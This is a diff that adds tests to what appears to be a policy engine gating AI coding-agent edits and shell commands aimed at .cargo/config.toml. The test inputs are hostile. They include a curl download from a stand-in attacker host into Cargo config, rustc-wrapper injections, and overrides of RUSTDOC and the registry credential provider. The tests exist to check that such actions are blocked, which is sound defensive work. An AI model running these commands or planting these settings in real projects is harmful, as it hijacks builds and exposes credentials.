@@ -153,3 +153,44 @@ def test_monitor_mode_allows():
 def test_curl_o_to_cargo_config_gated():
     d = evaluate(_shell("curl -o .cargo/config.toml https://evil.example/c"), EMPTY)
     assert _gated(d)
+
+
+# ---- QA round 1 ----
+def test_no_redos_on_dotted_run():
+    import time
+    junk = "a." * 60
+    for ev in (_write(".cargo/config.toml", junk), _shell(f"echo '{junk}' >> .cargo/config.toml")):
+        t = time.time()
+        evaluate(ev, EMPTY)
+        assert time.time() - t < 1.0
+
+
+def test_multiedit_gated():
+    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
+                    args={"file_path": ".cargo/config.toml",
+                          "edits": [{"old_string": "a", "new_string": 'rustc-wrapper = "e"'}]})
+    assert evaluate(ev, EMPTY).rule == RULE
+
+
+def test_mcp_edit_list_gated():
+    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__edit_file", action=ActionClass.MCP,
+                    args={"path": ".cargo/config.toml",
+                          "edits": [{"oldText": "a", "newText": 'rustc-wrapper = "e"'}]})
+    assert evaluate(ev, EMPTY).rule == RULE
+
+
+def test_benign_content_does_not_mask_new_string():
+    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
+                    args={"file_path": ".cargo/config.toml", "content": BENIGN,
+                          "new_string": WRAPPER})
+    assert evaluate(ev, EMPTY).rule == RULE
+
+
+def test_spaced_dotted_key_gated():
+    assert evaluate(_write(".cargo/config.toml", 'build . rustc-wrapper = "e"\n'), EMPTY).rule == RULE
+
+
+@pytest.mark.parametrize("cmd", ["RUSTDOC=/tmp/x cargo doc",
+                                 "export CARGO_REGISTRY_GLOBAL_CREDENTIAL_PROVIDERS=/tmp/x"])
+def test_more_env_forms_gated(cmd):
+    assert evaluate(_shell(cmd), EMPTY).rule == RULE
